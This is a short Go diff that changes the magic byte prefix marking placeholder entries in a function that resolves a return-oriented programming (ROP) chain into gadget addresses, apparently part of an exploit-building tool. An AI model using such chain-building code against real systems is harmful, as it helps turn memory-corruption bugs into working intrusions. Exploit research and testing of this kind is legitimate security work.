@@ -114,7 +114,7 @@ func parseROPChain(unresolvedROPChain []byte) ([1024]byte, error) {
 
 	for i := 0; i < len(unresolvedROPChain); i += 8 {
 		chunk := unresolvedROPChain[i : i+8]
-		if bytes.HasPrefix(chunk, []byte{0xba, 0xbe, 0x69, 0x41, 0x42, 0x43}) {
+		if bytes.HasPrefix(chunk, []byte{0xba, 0x68, 0x65, 0x77, 0x6d, 0xbe}) {
 			gadgetAddr := uint64(binary.BigEndian.Uint16(chunk[6:8])) + uint64(firstRetPointer)
 			binary.LittleEndian.PutUint64(ropChain[i:i+8], gadgetAddr)
 			continue
